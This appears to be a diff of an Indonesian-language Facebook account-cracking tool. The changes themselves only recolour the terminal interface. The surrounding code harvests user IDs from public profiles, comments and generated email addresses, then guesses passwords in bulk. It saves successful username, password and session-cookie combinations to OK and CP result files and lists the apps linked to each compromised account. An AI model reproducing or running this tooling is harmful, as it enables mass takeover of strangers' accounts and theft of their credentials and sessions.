@@ -22,6 +22,7 @@ H2 = "[#00FF00]" # HIJAU
 K2 = "[#FFFF00]" # KUNING
 B2 = "[#00C8FF]" # BIRU
 P2 = "[#FFFFFF]" # PUTIH
+U2 = "[#AF00FF]" #UNGU
 
 ###----------[ GLOBAL NAMA ]---------- ###
 sekarang = calendar.timegm(time.gmtime(time.time()))
@@ -35,7 +36,7 @@ try:
 	color_panel = file_color.split("*")[1]
 except:
 	color_text = "[#FF0000]"
-	color_panel = "#FF0000"
+	color_panel = "#AF00FF"
 
 ###----------[ GET DATA DARI DEVICE ]---------- ###
 android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
@@ -184,18 +185,18 @@ class Menu:
 			Login().menu_login()
 		
 		###----------[ PANEL BIASA ]---------- ###
-		prints(Panel(f"{K2}{self.ip}",padding=(0,30),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{K2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari random username
-[{color_text}02{K2}]. crack dari pengikut    [{color_text}06{P2}]. crack dari pencarian nama
-[{color_text}03{K2}]. crack dari komentar    [{color_text}07{P2}]. crack dari member grup
-[{color_text}04{K2}]. crack dari random mail [{color_text}08{P2}]. crack dari file sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
-		prints(Panel(f"""{K2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
-		menu = console.input(f" {H2}• {P2}pilih menu : ")
+		prints(Panel(f"{K2}{self.ip}",padding=(0,30),title=f"{K2}{nama}",subtitle=f"{K2}{self.negara}",style=f"{color_panel}"))
+		prints(Panel(f"""{K2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{K2}]. crack dari random username
+[{color_text}02{K2}]. crack dari pengikut    [{color_text}06{K2}]. crack dari pencarian nama
+[{color_text}03{K2}]. crack dari komentar    [{color_text}07{K2}]. crack dari member grup
+[{color_text}04{K2}]. crack dari random mail [{color_text}08{K2}]. crack dari file sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
+		prints(Panel(f"""{K2}ketik {M2}bot{K2} untuk ke menu bot dan ketik {M2}lain{K2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
+		menu = console.input(f" {M2}• {K2}pilih menu : ")
 		
 		###----------[ ID PUBLIK ]---------- ###
 		if menu in["1","01"]:
-			prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id atau username : ")
+			prints(Panel(f"""{K2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
+			user = console.input(f" {M2}• {K2}masukan id atau username : ")
 			if user in["Me","me"]:
 				user = Dump(cookie).GetUser()
 			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
@@ -203,17 +204,17 @@ class Menu:
 			
 		###----------[ KOMENTAR ]---------- ###
 		elif menu in["3","03"]:
-			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id postingan : ")
+			prints(Panel(f"""{K2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {M2}• {K2}masukan id postingan : ")
 			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
 			Crack().atursandi()
 			
 		###----------[ EMAIL ]---------- ###
 		elif menu in["4","04"]:
-			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			format = console.input(f" {H2}• {P2}masukan format : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
+			prints(Panel(f"""{K2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {M2}• {K2}masukan nama : ")
+			format = console.input(f" {M2}• {K2}masukan format : ")
+			limit = console.input(f" {M2}• {K2}masukan limit : ")
 			Dump(cookie).Dump_Email(user,format,limit)
 			Crack().atursandi()
 			
@@ -291,7 +292,7 @@ class Dump:
 					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
 					if uid+"<=>"+nama in tampung:pass
 					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
+					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for x in url.find_all("a",href=True):
 				if "Lihat Teman Lain" in x.text:
 					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
@@ -308,7 +309,7 @@ class Dump:
 					nama = ids.text
 					if uid+"<=>"+nama in tampung:pass
 					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
+					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for z in data.find_all("a",href=True):
 				if "Lihat komentar sebelumnya…" in z.text:
 					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
@@ -398,7 +399,7 @@ class Crack:
 	###----------[ ATUR SANDI DAN METODE ]---------- ###
 	def atursandi(self):
 		prints(Panel(f"""{P2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
-		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
+		set = console.input(f" {M2}• {K2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
 		
 		###----------[ SANDI MANUAL ]---------- ###
 		if set in["Y","y"]:
@@ -476,7 +477,7 @@ class Crack:
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}•{P2}{H2}[IQBALgntg]•{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
+		prog.update(des,description=f" {M2}•{K2}{M2}[IQBALgntg]•{K2} {str(self.loop)}/{len(tampung)} OK : {M2}{len(self.ok)}{K2} CP : {K2}{len(self.cp)}{K2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
@@ -545,8 +546,8 @@ class Crack:
 
 	###----------[ PRINT SIMPAN HASIL ]---------- ###
 	def simpan_hasil(self):
-		prints(Panel(f"""\r{P2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
-{P2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
+		prints(Panel(f"""\r{K2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
+{K2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
 	
 	###----------[ PRINT MUNCUL APK ]---------- ###
 	def get_apk(self,user,pw,cookie):
@@ -575,10 +576,10 @@ class Crack:
 		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
 		self.apkaktif("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookie)
 		if len(self.aktif)==0:
-			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
+			aktip.add(f"{K2}tidak ada aplikasi yang terkait")
 		else:
 			for apk in self.aktif:
-				aktip.add(f"{H2}{apk}{P2}")
+				aktip.add(f"{M2}{apk}{K2}")
 				
 		###----------[ APLIKASI KADALUWARSA ]---------- ###
 		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
@@ -590,10 +591,10 @@ class Crack:
 				kadalu.add(f"{M2}{apk}{P2}")
 			
 		###----------[ PRINT SEMUA ]---------- ###
-		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+		tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
 		tree.add(aktip)
 		tree.add(kadalu)
-		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
+		tree.add(Panel(f"{M2}{cookie}{K2}",style=f"{color_panel}"))
 		prints(tree)
 		
 	###----------[ GET APK AKTIF ]---------- ###
@@ -632,8 +633,8 @@ class Lain:
 	###----------[ MENU ]---------- ###
 	def menu(self):
 		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
-[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
-[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}]. logout ({M2}hapus login{P2})""",width=80,padding=(0,7),style=f"{color_panel}"))
+[{color_text}02{K2}]. get info akun target    [{color_text}05{K2}]. tampilkan info cookies
+[{color_text}03{K2}]. setting user agent      [{color_text}06{K2}]. logout ({M2}hapus login{K2})""",width=80,padding=(0,7),style=f"{color_panel}"))
 		menu = console.input(f" {H2}• {P2}pilih menu : ")
 		if menu in["01","1"]:
 			self.cek_hasil()
@@ -649,9 +650,9 @@ class Lain:
 
 	###----------[ CEK HASIL CRACK ]---------- ###
 	def cek_hasil(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
+		prints(Panel(f"""{K2}[{color_text}01{K2}]. lihat akun hasil crack ok
 [{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
-		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
+		ask = console.input(f" {M2}• {K2}masukan pilihan : ")
 		if ask in["1","01"]:folder = "OK"
 		else:folder = "CP"
 		
@@ -663,12 +664,12 @@ class Lain:
 			num += 1
 			self.file.append(fil)
 			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
-			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
+			self.listfile.append(Panel(f"{K2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
+			self.listfile.append(Panel(f"{K2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
+			self.listfile.append(Panel(f"{K2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
 		console.print(Columns(self.listfile))
-		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
-		result = console.input(f" {H2}• {P2}masukan angka : ")
+		prints(Panel(f"""{K2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
+		result = console.input(f" {M2}• {K2}masukan angka : ")
 		
 		###----------[ MULAI CEK ]---------- ###
 		try:
@@ -678,19 +679,19 @@ class Lain:
 			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
 			exit()
 		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
-		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
+		prints(Panel(f"""{K2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=80,style=f"{color_panel}"))
 		for akun in totalhasil:
 			user = akun.split("|")[0]
 			pw = akun.split("|")[1]
 			tree = Tree(" ",guide_style=f"{color_panel}")
 			if folder=="OK":
 				cookie = akun.split("|")[2]
-				tree.add(f"\r{H2}{user}|{pw}{P2} ")
-				tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
+				tree.add(f"\r{H2}{user}|{pw}{K2} ")
+				tree.add(Panel(f"{H2}{cookie}{K2}",style=f"{color_panel}"))
 			else:
-				tree.add(f"\r{K2}{user}|{pw}{P2} ")
+				tree.add(f"\r{M2}{user}|{pw}{K2} ")
 			prints(tree)
-		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
+		prints(Panel(f"""{K2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=80,padding=(0,7),style=f"{color_panel}"))
 		exit()
 		
 	###----------[ GANTI WARNA TEMA ]---------- ###
